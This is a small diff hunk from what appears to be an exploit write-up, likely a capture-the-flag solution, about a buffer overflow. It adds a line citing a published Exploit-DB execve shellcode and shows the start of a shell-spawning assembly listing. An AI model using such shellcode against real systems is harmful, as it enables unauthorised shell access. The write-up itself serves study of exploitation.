@@ -131,6 +131,8 @@ Since authentication is impossible due to the logic bug, we exploit the buffer o
 
 ### Shellcode Breakdown
 
+We use a standard Linux x86 execve shellcode from [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428):
+
 ```nasm
 ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
 xor eax, eax        ; \x31\xc0
